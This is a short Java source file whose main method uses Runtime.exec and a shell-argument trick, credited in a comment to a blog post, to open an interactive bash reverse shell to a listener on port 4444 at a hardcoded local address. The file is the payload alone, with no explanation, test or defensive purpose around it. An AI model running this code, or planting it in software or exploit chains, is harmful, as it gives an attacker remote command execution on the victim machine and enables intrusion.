
public class r2 {
	public static void main(String argv[]) {
		
		Runtime r = Runtime.getRuntime();
		Process p = null;
		try {
            // https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html
			p = r.exec("sh -c $@|sh . echo bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'");
			p.waitFor();
		}catch(Exception ex) {
			ex.printStackTrace();
		}finally {
			if(p != null)
				p.destroy();
		}
	}
}
